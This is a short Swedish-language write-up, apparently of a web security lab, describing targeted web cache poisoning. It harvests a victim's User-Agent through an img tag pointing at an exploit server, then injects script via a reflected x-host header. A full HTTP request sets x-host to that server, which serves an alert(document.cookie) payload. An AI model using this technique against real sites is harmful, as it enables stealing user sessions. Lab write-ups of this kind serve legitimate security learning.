Det jag missade på denna var att User-Agent är en del av cached nyckeln.
Det betyder att varje användare som har en unik User-Agent: eller en user-agent som matchar den du skickar in kommer beröras av cachpoisoningen.

du vill ha en specifik användare ska beröras. kolla på js koden som finns för att sanera kommentarer. dom använder dompurify, fuck, men de tillåter img och src attribut. lägg en img div med exploit server som src. du kommer få user agenten i /log.

använd denna för att kunna cacha så att den berör victim. 

när du kör en param miner kommer du hitta att x-host: som reflekteras i en script div. länka exploit server och matcha path. lägg in en alert(doc.cookie) i body.

ta bort cb och skicka. labben är löst. se requesten nedan.


```
GET / HTTP/1.1
Host: 0a07004003ba76ee804462b100d900a8.h1-web-security-academy.net
Cookie: session=7jOhNESmp4gMpXpakjAi2jhRCBSeGXeE
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a07004003ba76ee804462b100d900a8.h1-web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
x-host: exploit-0a6c001f0313766d808461ed01e400ef.exploit-server.net
```